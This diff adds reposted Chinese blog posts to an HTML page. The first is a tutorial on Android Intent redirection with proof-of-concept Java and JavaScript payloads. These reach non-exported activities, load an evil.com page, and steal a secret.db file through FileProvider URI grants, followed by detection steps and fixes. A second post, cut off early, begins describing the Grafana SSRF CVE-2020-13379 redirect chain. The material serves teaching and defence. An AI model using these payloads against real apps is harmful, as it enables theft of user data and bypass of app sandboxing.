@@ -82,6 +82,294 @@
 
     
         <h2 class="title">
+            <a href="/2024/01/22/Android-Internet-Redirect/">
+                Android App安全之Intent重定向详解
+            </a>
+        </h2>
+    
+    <time>
+        Jan 22, 2024
+    </time>
+    <section class="content">
+        <h1><span id="android-app安全之intent重定向详解">Android App安全之Intent重定向详解</span></h1><blockquote>
+<p>本文转自<a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/endpoint/271629.html">OPPO安珀实验室</a> 并作补充</p>
+</blockquote>
+<h2><span id="未导出组件和非导出组件">未导出组件和非导出组件</span></h2><h3><span id="导出组件公有组件">导出组件(公有组件)</span></h3><blockquote>
+<p>导出组件一般有以下三种形式：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1.在AndroidManifest.xml中的组件如果显式设置了组件属性android:exported值为true;</span><br><span class="line"></span><br><span class="line">2.如果组件没有显式设置android:exported为false，但是其intent-filter以及action存在，则也为导出组件;</span><br><span class="line"></span><br><span class="line">3.API Level在17以下的所有App的provider组件的android:exported属性默认值为true，17及以上默认值为false。</span><br></pre></td></tr></table></figure>
+
+<p>任意第三方App都可以访问导出组件。</p>
+</blockquote>
+<h3><span id="未导出组件专用组件">未导出组件(专用组件)</span></h3><blockquote>
+<p>1.在AndroidManifest.xml中注册的组件显式设置android:exported&#x3D;”false” ;</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">activity</span> <span class="attr">android:name</span>=<span class="string">&quot;.WebViewActivity&quot;</span> <span class="attr">android:exported</span>=<span class="string">&quot;false&quot;</span> /&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>2.组件没有intent-filter, 且没有显式设置android:exported的属性值，默认为非导出的;</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">activity</span> <span class="attr">android:name</span>=<span class="string">&quot;.WebViewActivity&quot;</span> /&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>3.组件虽然配置了intent-filter,，但是显式设置android:exported&#x3D;”false”。</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">activity</span> <span class="attr">android:name</span> =<span class="string">&quot;.WebViewActivity&quot;</span> <span class="attr">android:exported</span>=<span class="string">&quot;false&quot;</span> &gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">intent-filter</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">action</span> <span class="attr">android:name</span>=<span class="string">&quot;android.intent.action.VIEW&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">category</span> <span class="attr">android:name</span>=<span class="string">&quot;android.intent.category.DEFAULT&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">data</span> <span class="attr">android:scheme</span>=<span class="string">&quot;victim&quot;</span> <span class="attr">android:host</span>=<span class="string">&quot;secure_handler&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">intent-filter</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">activity</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>这三种组件称为专有组件或者未导出组件，三方应用无法直接调用这种组件。例如WebViewActivity中有以下代码：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">onCreate</span><span class="params">(Bundle savedInstanceState)</span> &#123;</span><br><span class="line">   <span class="built_in">super</span>.onCreate(savedInstanceState);</span><br><span class="line">  <span class="comment">// ... </span></span><br><span class="line">   <span class="type">Intent</span> <span class="variable">intent</span> <span class="operator">=</span> getIntent();</span><br><span class="line">   <span class="type">String</span> <span class="variable">Url</span> <span class="operator">=</span> intent.getStringExtra(<span class="string">&quot;url&quot;</span>);</span><br><span class="line">   <span class="comment">// ... </span></span><br><span class="line">   webView.loadUrl(Url);</span><br></pre></td></tr></table></figure>
+
+<p>第三方应用直接访问上述未导出的WebViewActivity组件来加载url，</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">intent</span> <span class="variable">intent</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Intent</span>();</span><br><span class="line">intent.setClassName(<span class="string">&quot;com.victim&quot;</span>, <span class="string">&quot;com.victim.ui.WebViewActivity&quot;</span>);</span><br><span class="line">intent.putExtra(<span class="string">&quot;url&quot;</span>, <span class="string">&quot;http://evil.com/&quot;</span>);</span><br><span class="line">startActivity(intent);</span><br></pre></td></tr></table></figure>
+
+<p>系统将会抛出java.lang.SecurityException, due to Permission Denial: WebViewActivity not exported from uid xxx.</p>
+</blockquote>
+<h2><span id="intent重定向">Intent重定向</span></h2><blockquote>
+<p>那么如果三方APP要想访问上述非导出的WebViewActivity是不是就没有办法了呢？</p>
+<p>当然不是! 其中一种常见的方式即为在本文中介绍Intent重定向， 即将Intent类的对象作为Intent 的Extras通过一个导出组件传递给非导出的组件, 以此来实现访问非导出的WebViewActivity组件。</p>
+<p>原理在于，Android 组件之间传输的Intent类是实现了Parcelable的。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Intent</span> <span class="keyword">implements</span> <span class="title class_">Parcelable</span>, Cloneable &#123;</span><br></pre></td></tr></table></figure>
+
+<p>因此可以将属于Intent类的对象作为Intent的 extra数据对象传递到另一个组件中，相当于在Intent中嵌入Intent。</p>
+<p>这时，如果App从不可信 Intent 的Extras字段中提取出嵌入的 Intent，然后对这个嵌入 Intent 调用 startActivity（或类似的 startService 和 sendBroadcast），这样做是很危险的； 因为攻击者原本是无法访问非导出的组件的，但是通过intent重定向，即以导出的组件作为桥即可以访问非exported的组件，达到launch anywhere或者broadcast anywhere的目的。</p>
+<p>其原理如下图所示:</p>
+<p><img src="/2024/01/22/Android-Internet-Redirect/1.png" alt="image"></p>
+<p>Intent重定向违反了Android的安全设计，导致Android的安全访问限制（App的沙箱机制）失效。</p>
+<p>Intent重定向可能导致以下安全问题：</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1.</span>启动非导出组件，通过精心构造的可控的Intent参数来执行敏感操作，如果可以重写或者替换native 库，甚至还会导致任意代码执行；</span><br><span class="line"></span><br><span class="line"><span class="number">2.</span>可以获取非导出的content provider组件的content：<span class="comment">// URI的访问权限来窃取敏感文件.</span></span><br></pre></td></tr></table></figure>
+
+<p>接下来我们分别举三个例子来说明:</p>
+</blockquote>
+<h3><span id="启动非导出组件">启动非导出组件</span></h3><blockquote>
+<p>我们继续以上述的未导出的WebViewActivity为例子， 查找在App中是否存在导出Activity中包含了Intent重定向漏洞。刚好存在一个导出的com.victim.ui.HomeActivity组件符合预期。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">onResume</span><span class="params">()</span> &#123; </span><br><span class="line">   <span class="comment">// ...  </span></span><br><span class="line">   handleIntentExtras(getIntent()); </span><br><span class="line">   <span class="comment">// 攻击者可以从外部输入任意intent</span></span><br><span class="line"> &#125;   </span><br><span class="line"> <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">handleIntentExtras</span><span class="params">(Intent intent)</span> &#123; </span><br><span class="line">    <span class="comment">// ... </span></span><br><span class="line">    <span class="type">Intent</span> <span class="variable">deeplinkIntent</span> <span class="operator">=</span> (Intent)intent.getParcelableExtra(<span class="string">&quot;extra_deep_link_intent&quot;</span>); </span><br><span class="line">    <span class="comment">// ... </span></span><br><span class="line">    <span class="keyword">if</span> (!(deeplinkIntent == <span class="literal">null</span> || <span class="built_in">this</span>.consumedDeeplinkIntent)) &#123; </span><br><span class="line">    / / ... </span><br><span class="line">        startActivity(deeplinkIntent); <span class="comment">// 危险! 打开攻击者发送的Intent</span></span><br><span class="line">     <span class="comment">// ... </span></span><br><span class="line">  &#125; </span><br><span class="line"> <span class="comment">// ... </span></span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>
+
+<p>攻击者可以实现通过这个导出的HomeActivity访问任何受保护的未导出的Activity; 我们可以编写一个攻击App，将发向HomeActivity的Intent重定向到未导出的组件WebViewActivity中，让WebViewActivity的WebView加载攻击者的恶意链接，从而达到绕过Android的权限限制的目的。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Intent</span> <span class="variable">next</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Intent</span>(); </span><br><span class="line">next.setClassName(<span class="string">&quot;com.victim&quot;</span>, <span class="string">&quot;com.victim.ui.WebViewActivity&quot;</span>); </span><br><span class="line">next.putExtra(<span class="string">&quot;extra_url&quot;</span>, <span class="string">&quot;http://evail.com&quot;</span>); <span class="comment">// 加载攻击者的钓鱼网站</span></span><br><span class="line">next.putExtra(<span class="string">&quot;extra_title&quot;</span>, <span class="string">&quot;test&quot;</span>); </span><br><span class="line"></span><br><span class="line"><span class="type">Intent</span> <span class="variable">intent</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Intent</span>(); </span><br><span class="line">intent .setClassName(<span class="string">&quot;com.victim&quot;</span>, <span class="string">&quot;com.victim.ui.HomeActivity&quot;</span>); intent .putExtra(<span class="string">&quot;extra_deep_link_intent&quot;</span>, next); <span class="comment">// 嵌入Intent</span></span><br><span class="line">startActivity(intent);</span><br></pre></td></tr></table></figure>
+</blockquote>
+<h3><span id="越权访问content-provider">越权访问content provider</span></h3><blockquote>
+<p>除了可以访问任意组件之外，攻击者还可以访问满足以下条件的APP的Content Provider的组件：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1.该组件必须是非导出的（否则可以直接攻击，无需使用我们在本文中讨论的模型）</span><br><span class="line"></span><br><span class="line">2.组件还设置了android：grantUriPermissions为true。</span><br></pre></td></tr></table></figure>
+
+<p>同时，攻击者在实现攻击时，必须将自己设置为嵌入Intent的接收者，并设置以下标志：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">1).Intent.FLAG_GRANT_PERSISTABLE_URI_PERMISSION允许对提供者的持久访问（没有此标志，则访问仅为一次）</span><br><span class="line"></span><br><span class="line">2).Intent.FLAG_GRANT_PREFIX_URI_PERMISSION允许通过前缀进行URI访问。</span><br><span class="line"></span><br><span class="line">3).Intent.FLAG_GRANT_READ_URI_PERMISSION允许对提供程序进行读取操作（例如query，openFile，openAssetFile）</span><br><span class="line"></span><br><span class="line">4).Intent.FLAG_GRANT_WRITE_URI_PERMISSION允许写操作</span><br></pre></td></tr></table></figure>
+
+<p>比如在App中有一个非导出的file provider, 该provider在其私有目录的database路径下保存了secret.db文件，该文件中保存了用户的登录账号信息。</p>
+<p>该file provider的设置如下：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">provider</span> <span class="attr">android:name</span>=<span class="string">&quot;androidx.core.content.FileProvider&quot;</span> <span class="attr">android:exported</span>=<span class="string">&quot;false&quot;</span> <span class="attr">android:authorities</span>=<span class="string">&quot;com.android.victim&quot;</span> <span class="attr">android:grantUriPermissions</span>=<span class="string">&quot;true&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta-data</span> <span class="attr">android:name</span>=<span class="string">&quot;android.support.FILE_PROVIDER_PATHS&quot;</span> <span class="attr">android:resource</span>=<span class="string">&quot;@xml/provider_paths&quot;</span>/&gt;</span><span class="tag">&lt;/<span class="name">provider</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>为了简便起见，APP的资源文件res&#x2F;xml&#x2F;provider_paths文件的配置为</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">paths</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">root-path</span> <span class="attr">name</span>=<span class="string">&quot;root&quot;</span> <span class="attr">path</span>=<span class="string">&quot;/&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">paths</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>我们无法直接访问file provider， 但是可以通过Intent重定向来窃取secret.db文件。</p>
+<p>payload如下:</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Intent next= <span class="keyword">new</span> <span class="title class_">Intent</span>();</span><br><span class="line">next.setClassName(getPackageName(), <span class="string">&quot;com.Attacker.AttackerActivity&quot;</span>); </span><br><span class="line"><span class="comment">// 设置为攻击者自己的组件</span></span><br><span class="line">next.setData(Uri.parse(<span class="string">&quot;content://com.victim.localfile/secret.db&quot;</span>)); </span><br><span class="line">next.setFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION | Intent.FLAG_GRANT_WRITE_URI_PERMISSION |   Intent.FLAG_GRANT_PERSISTABLE_URI_PERMISSION  | Intent.FLAG_GRANT_PREFIX_URI_PERMISSION); </span><br><span class="line"><span class="comment">// 添加所有可以访问content provider的读写flag</span></span><br><span class="line"></span><br><span class="line"><span class="type">Intent</span> <span class="variable">intent</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Intent</span>();</span><br><span class="line">intent.setClassName(<span class="string">&quot;com.victim.localfile&quot;</span>, <span class="string">&quot;com.victim.localfile.LoginActivity&quot;</span>); intent.putExtra(<span class="string">&quot;com.victim.extra.NEXT_INTENT&quot;</span>, next); </span><br><span class="line">startActivity(intent);</span><br></pre></td></tr></table></figure>
+</blockquote>
+<h3><span id="通过webview访问任意组件">通过WebView访问任意组件</span></h3><blockquote>
+<p>通常我们可以通过调用Intent.toUri（flags）方法将Intent对象转换为字符串，同时可以使用Intent.parseUri（stringUri，flags）将字符串从字符串转换回Intent。此功能通常在WebView（APP内置浏览器）中使用。APP可以解析intent:&#x2F;&#x2F; 这种类型的scheme，将URL字符串解析为Intent对象并启动相关的Activity。</p>
+<p>漏洞代码示例:</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">shouldOverrideUrlLoading</span><span class="params">(WebView view, WebResourceRequest request)</span> &#123;</span><br><span class="line">    <span class="type">Uri</span> <span class="variable">uri</span> <span class="operator">=</span> request.getUrl();</span><br><span class="line"><span class="keyword">if</span>(<span class="string">&quot;intent&quot;</span>.equals(uri.getScheme())) &#123;</span><br><span class="line">        startActivity(Intent.parseUri(uri.toString(), Intent.URI_INTENT_SCHEME));</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">return</span> <span class="built_in">super</span>.shouldOverrideUrlLoading(view, request);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>要利用此漏洞，攻击者可以通过Intent.Uri方法创建一个WebView重定向Intent 的url，然后让WebViewActivity去加载该Url，由于在shouldOverrideUrlLoading方法中没有做完整的校验，会存在Intent重定向漏洞。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Intent</span> <span class="variable">intent</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Intent</span>();</span><br><span class="line">intent.setClassName(<span class="string">&quot;com.victim&quot;</span>, <span class="string">&quot;com.victim.WebViewActivity&quot;</span>);i</span><br><span class="line">ntent.putExtra(<span class="string">&quot;url&quot;</span>, <span class="string">&quot;http://evil.com/&quot;</span>);</span><br><span class="line">Log.d(<span class="string">&quot;evil&quot;</span>, intent.toUri(Intent.URI_INTENT_SCHEME)); </span><br><span class="line"><span class="comment">//&quot;intent:#Intent;component=com.victim/.WebViewActivity;S.url=http%3A%2F%2Fevil.com%2F;end&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 攻击代码</span></span><br><span class="line">location.href = <span class="string">&quot;intent;component=com.victim/.WebViewActivity;S.url=http%3A%2F%2Fevil.com%2F;end&quot;</span>;</span><br></pre></td></tr></table></figure>
+</blockquote>
+<h2><span id="查看此类漏洞的方法">查看此类漏洞的方法</span></h2><blockquote>
+<p>如何在App中快速的找到此类漏洞呢？我们可以从以下三个方面入手:</p>
+<p>1.在App中查找导出组件，并且检查该组件是否接收从外部输入的Intent对象。</p>
+<p>2.在上述组件中查找对startActivity（或 startService 和 sendBroadcast）的调用，并验证其Intent组件是否是从受信任的数据对象来构造的。</p>
+<p>3.查找Intent 的 getExtras方法的调用，是否有将该方法的返回值强制转换为Intent；并在使用这种嵌入的Intent之前进行了完整的校验。</p>
+</blockquote>
+<h2><span id="漏洞缓解方法">漏洞缓解方法</span></h2><blockquote>
+<p>那么，如何缓解Intent重定向漏洞呢 ？</p>
+</blockquote>
+<h3><span id="方法1将受影响的应用组件设为专用组件">方法1：将受影响的应用组件设为专用组件。</span></h3><blockquote>
+<p>如果受影响的应用组件不需要接收来自其他应用的 Intent，可以将此应用组件设为专用组件，只需在清单中设置 android:exported&#x3D;“false” 即可。</p>
+</blockquote>
+<h3><span id="方法2确保提取的intent来自可信的来源">方法2：确保提取的Intent来自可信的来源。</span></h3><blockquote>
+<p>可以使用 getCallingActivity 等方法来验证源 Activity 是否可信。</p>
+<p>例如：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 检查源 Activity 是否来自可信的包名</span></span><br><span class="line"> <span class="keyword">if</span> (getCallingActivity().getPackageName().equals(“known”)) &#123;</span><br><span class="line">   <span class="type">Intent</span> <span class="variable">intent</span> <span class="operator">=</span> getIntent();</span><br><span class="line">   <span class="comment">// 提取嵌套的 Intent</span></span><br><span class="line">   <span class="type">Intent</span> <span class="variable">forward</span> <span class="operator">=</span> (Intent) intent.getParcelableExtra(“key”);</span><br><span class="line">   <span class="comment">// 重定向嵌套的 Intent</span></span><br><span class="line">   startActivity(forward ) ;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>
+
+<p>注意：检查 getCallingActivity() 是否返回非null值并不足以防范此漏洞。恶意App可以为此函数提供 null 值，最好加上APP的签名校验。</p>
+</blockquote>
+<h3><span id="方法3确保要重定向的intent是无害的">方法3：确保要重定向的Intent是无害的。</span></h3><blockquote>
+<p>需要先验证重定向的Intent，确保该 Intent</p>
+<p><strong>1.不会被发送到APP的任何专用组件</strong></p>
+<p><strong>2.不会被发送到外部应用的组件。如果重定向的目标是外部应用，请确保该 Intent 不会向APP的私有content provider授予URI权限。</strong></p>
+<p>在重定向 Intent 之前，应用可以先使用resolveActivity等方法检查将使用哪个组件来处理该 Intent。</p>
+<p>例如：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Intent</span> <span class="variable">intent</span> <span class="operator">=</span> getIntent();</span><br><span class="line"> <span class="comment">// 提取嵌套的 Intent</span></span><br><span class="line"> <span class="type">Intent</span> <span class="variable">forward</span> <span class="operator">=</span> (Intent) intent.getParcelableExtra(“key”);</span><br><span class="line"> <span class="comment">// 获取组件名称</span></span><br><span class="line"> <span class="type">ComponentName</span> <span class="variable">name</span> <span class="operator">=</span> forward.resolveActivity(getPackageManager());</span><br><span class="line"> <span class="comment">// 检查软件包名称和类名称是否符合预期</span></span><br><span class="line"> <span class="keyword">if</span> (name.getPackageName().equals(“safe_package”) &amp;&amp;</span><br><span class="line">     name.getClassName().equals(“safe_class”)) &#123;</span><br><span class="line">   <span class="comment">// 重定向嵌套的 Intent</span></span><br><span class="line">   startActivity(forward);</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>
+
+<p>App可以使用getFlags等方法来检查 Intent 是否会授予 URI 权限。应用还可以使用removeFlags撤消 URI 权限的授予。</p>
+<p>例如：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 提取嵌套的 Intent</span></span><br><span class="line"> <span class="type">Intent</span> <span class="variable">forward</span> <span class="operator">=</span> (Intent) intent.getParcelableExtra(“key”);</span><br><span class="line"> <span class="comment">// 获取标记</span></span><br><span class="line"> <span class="type">int</span> <span class="variable">flags</span> <span class="operator">=</span> forward.getFlags();</span><br><span class="line"> <span class="comment">// 检查嵌套的 Intent 不能授予 URI 读写权限</span></span><br><span class="line"> <span class="keyword">if</span> (( flags &amp; Intent.FLAG_GRANT_READ_URI_PERMISSION == <span class="number">0</span>) &amp;&amp;</span><br><span class="line">     (flags &amp; Intent.FLAG_GRANT_WRITE_URI_PERMISSION == <span class="number">0</span>)) &#123;</span><br><span class="line">    / / 重定向嵌套的 Intent</span><br><span class="line">       <span class="title function_">startActivity</span><span class="params">(forward)</span>;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>
+</blockquote>
+<h2><span id="参考">参考</span></h2><blockquote>
+<p>[1] Intent Redirection Vulnerability <a target="_blank" rel="noopener" href="https://support.google.com/faqs/answer/9267555?hl=en">https://support.google.com/faqs/answer/9267555?hl=en</a></p>
+<p>[2] #272044 Android - Access of some not exported content providers<a target="_blank" rel="noopener" href="https://hackerone.com/reports/272044[3]">https://hackerone.com/reports/272044[3]</a> #200427 Access of Android protected components via embedded intent<a target="_blank" rel="noopener" href="https://hackerone.com/reports/200427[4]">https://hackerone.com/reports/200427[4]</a> Intent.toUri<a target="_blank" rel="noopener" href="https://developer.android.com/reference/android/content/Intent#toURI()">https://developer.android.com/reference/android/content/Intent#toURI()</a></p>
+</blockquote>
+
+
+        
+
+        
+            <div class="tags">
+                <a class="tag-none-link" href="/tags/Android/" rel="tag">Android</a><a class="tag-none-link" href="/tags/Exploit/" rel="tag">Exploit</a><a class="tag-none-link" href="/tags/Reprint/" rel="tag">Reprint</a>
+            </div>
+        
+
+    </section>
+</article>
+  
+    <article class="post ">
+
+    
+        <h2 class="title">
+            <a href="/2024/01/19/CVE-2020-13379-Grafana/">
+                挖洞经验 | Grafana应用实例未授权读取型SSRF（CVE-2020-13379）
+            </a>
+        </h2>
+    
+    <time>
+        Jan 19, 2024
+    </time>
+    <section class="content">
+        <h1><span id="挖洞经验-grafana应用实例未授权读取型ssrfcve-2020-13379">挖洞经验 | Grafana应用实例未授权读取型SSRF（CVE-2020-13379）</span></h1><blockquote>
+<p>本文转自<a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/245582.html">clouds</a> 并作补充</p>
+<p><strong>近期，我在做Grafana公司的安全众测，通过研究我发现综合利用重定向跳转和URL参数注入漏洞，可以在Grafana产品任意实例中实现未授权的服务端请求伪造攻击（SSRF），漏洞影响版本为3.0.1至7.0.1的大范围Grafana产品，相关情况上报后被分配了CVE-2020-13379的漏洞编号。（漏洞PDF技术细节<a target="_blank" rel="noopener" href="https://docs.google.com/presentation/d/1He_zFFXCuft3LsZTXbHKoDxQHNoSveZg2c2uF1HKuaw/edit?usp=sharing">点此下载</a>）</strong></p>
+</blockquote>
+<h2><span id="漏洞发现过程">漏洞发现过程</span></h2><blockquote>
+<p>在Grafana名为<a target="_blank" rel="noopener" href="https://github.com/grafana/grafana/blob/78febbbeef1f23ccbb88c2bd3acd2e9c2011e02a/pkg/api/api.go#L423">api.go的开源文件</a>中，位于其第423行有这么一行代码：</p>
+<p><code>r.Get(&quot;/avatar/:hash&quot;, avatarCacheServer.Handler)</code></p>
+<p>为了加载用户上传保存于gravatar上的头像图片，该行代码读取**&#x2F;avatar&#x2F;:hash<strong>中的哈希值（如</strong><a target="_blank" rel="noopener" href="https://www.gravatar.com/avatar/205e460b479e2e5b48aec07710c08d50/.....**%EF%BC%89%EF%BC%8C%E5%B9%B6%E6%8A%8A%E5%AE%83%E4%BC%A0%E9%80%92%E7%BB%99%E5%9F%9F%E5%90%8D%E4%B8%BA**secure.grafana.com**%E7%9A%84%E7%9B%B8%E5%85%B3%E8%B7%AF%E5%BE%84%E3%80%82%E8%BF%99%E9%87%8C%EF%BC%8C%E5%A4%A7%E8%87%B4%E7%9A%84%E4%BB%A3%E7%A0%81%E9%80%BB%E8%BE%91%E5%A6%82%E4%B8%8B%EF%BC%9A">https://www.gravatar.com/avatar/205e460b479e2e5b48aec07710c08d50/.....**），并把它传递给域名为**secure.grafana.com**的相关路径。这里，大致的代码逻辑如下：</a></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">const (</span><br><span class="line"> gravatarSource = <span class="string">&quot;https://secure.gravatar.com/avatar/&quot;</span></span><br><span class="line">)</span><br><span class="line">...</span><br><span class="line"><span class="type">case</span> <span class="variable">err</span> <span class="operator">=</span> &lt;-thunder.GoFetch(gravatarSource+<span class="built_in">this</span>.hash+<span class="string">&quot;?&quot;</span>+<span class="built_in">this</span>.reqParams, <span class="built_in">this</span>):</span><br></pre></td></tr></table></figure>
+
+<p>上述代码逻辑中的<strong>this.hash</strong>也就是前述**&#x2F;avatar&#x2F;:hash<strong>经URL编码传递过来的hash，实际上这个被URL编码过的</strong>:hash<strong>串中，允许我们插入其它参数从而形成URL参数注入。在secure.gravatar.com域名路径下，如果向其中插入参数d，即</strong><a target="_blank" rel="noopener" href="https://secure.gravatar.com/avatar/205e460b479e2e5b48aec07710c08d50?d=....**%EF%BC%8C%E4%B9%8B%E5%90%8E%EF%BC%8C%E5%B0%B1%E4%BC%9A%E5%8F%91%E7%94%9F%E8%B7%B3%E8%BD%AC%E5%88%B0%E5%8F%A6%E4%B8%80%E4%B8%AA%E5%9B%BE%E7%89%87%E5%AD%98%E5%82%A8%E6%9C%8D%E5%8A%A1**i0.wp.com**%E7%9A%84%E6%83%85%E5%86%B5%EF%BC%8C%E8%BF%99%E6%98%AF%E5%90%8E%E7%BB%AD%E8%B7%B3%E8%BD%AC%E5%88%A9%E7%94%A8%E9%93%BE%E4%B8%AD%E7%9A%84%E7%AC%AC%E4%B8%80%E4%B8%AA%E8%B7%B3%E8%BD%AC%E9%97%AE%E9%A2%98%E3%80%82">https://secure.gravatar.com/avatar/205e460b479e2e5b48aec07710c08d50?d=....**，之后，就会发生跳转到另一个图片存储服务**i0.wp.com**的情况，这是后续跳转利用链中的第一个跳转问题。</a></p>
+<p>所以，我们还需要从i0.wp.com继续构造跳转，好在最后，由于主机验证机制中一个不当的正则表达式应用，我们成功形成了跳转。过程是这样的：</p>
